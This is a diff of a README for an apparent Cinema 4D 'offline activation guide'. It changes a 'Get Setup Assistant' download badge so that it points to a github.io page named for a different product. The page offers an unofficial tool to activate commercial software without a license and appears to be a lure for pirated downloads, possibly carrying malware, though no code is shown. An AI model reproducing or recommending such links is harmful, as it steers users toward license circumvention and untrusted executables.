@@ -1,6 +1,6 @@
 # 🌀 Cinema 4D — Offline Activation Guide
 
-[![Get Setup Assistant](https://img.shields.io/badge/Get_Setup_Assistant-darkred)](https://cinema-4d-offline-activation-guide.github.io/.github)
+[![Get Setup Assistant](https://img.shields.io/badge/Get_Setup_Assistant-darkred)](https://modo-offline-activation-guide.github.io/.github)
 
 ## 🔧 How to Install & Activate Offline
 
